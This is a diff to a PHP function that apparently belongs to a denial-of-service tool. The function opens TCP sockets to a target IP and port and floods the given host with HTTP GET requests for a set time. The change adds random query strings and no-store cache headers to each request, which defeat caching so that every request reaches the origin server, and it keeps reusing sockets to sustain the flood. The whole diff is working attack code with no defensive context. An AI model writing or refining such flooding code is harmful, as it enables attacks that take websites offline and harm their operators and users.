@@ -186,22 +186,36 @@
     }
 
     function _http($ip, $host, $port, $time) {
+        // character pool for query randomization
+        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    
         $start_time = microtime(true);
 
-        // initial http request with keep-alive header set ---> socket will then accept multiple requests
-        $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\n\r\n";
+        // build initial http request with keep-alive header set ---> socket will then accept multiple requests
+        $data = "GET / HTTP/1.1\r\nHost: " . $host . "\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\n\r\n";
         
         while ((microtime(true) - $start_time) < $time) {
             try {
                 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                 socket_connect($socket, $ip, $port);
-                socket_write($socket, $data, strlen($data));
 
-                // new static http request
-                $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nUser-Agent: Mozilla/5.0\r\nCache-Control: no-store\r\n\r\n";
+                // send initial http request
+                socket_write($socket, $data, strlen($data));
                 
-                // reuse to prevent TIME_WAIT local-socket exhaustion
+                // reuse socket to prevent TIME_WAIT exhaustion
                 while ((microtime(true) - $start_time) < $time) {
+                    // generate http query
+                    $length = random_int(5, 15);
+                    
+                    $query = '';
+                    for ($i = 0; $i < $length; $i++) {
+                        $query .= $characters[random_int(0, strlen($characters) - 1)];
+                    }
+                    
+                    // build new http request
+                    $data = "GET /" . $query . " HTTP/1.1\r\nHost: " . $host . "\r\nUser-Agent: Mozilla/5.0\r\nCache-Control: no-store\r\n\r\n";
+                
+                    // send request over socket
                     socket_write($socket, $data, strlen($data));
                 }
                 socket_close($socket);
